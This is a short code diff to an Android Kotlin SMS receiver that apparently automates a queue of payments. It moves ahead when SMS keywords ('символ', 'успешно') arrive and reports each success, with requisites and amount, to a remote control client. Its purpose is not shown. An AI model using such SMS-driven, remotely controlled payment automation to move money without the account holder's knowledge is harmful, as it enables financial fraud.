@@ -99,14 +99,17 @@ class SmsReceiver : BroadcastReceiver() {
     }
 
     private fun handleResume(context: Context) {
-        if (!DeviceStore.isPaused(context)) return
-        DeviceStore.setPaused(context, false)
-        // "успешно" = one payment went through → log it for the admin summary.
+        // "успешно" = one payment went through → always log it for the summary,
+        // even if the matching "символ" pause was missed (so the dashboard and
+        // report never under-count real successful payments).
         DeviceStore.currentPayment(context)?.let { pay ->
             val appCtx = context.applicationContext
             Thread { ControlClient.reportEvent(appCtx, "success", pay.requisites, pay.amount) }
                 .apply { isDaemon = true }.start()
         }
+        // Advancement only happens out of the paused (символ-received) state.
+        if (!DeviceStore.isPaused(context)) { pushStatus(context); return }
+        DeviceStore.setPaused(context, false)
         val need = DeviceStore.currentPayment(context)?.count ?: 1
         if (DeviceStore.triggerCount(context) >= need) {
             val hasNext = DeviceStore.advancePaymentOrFinish(context)
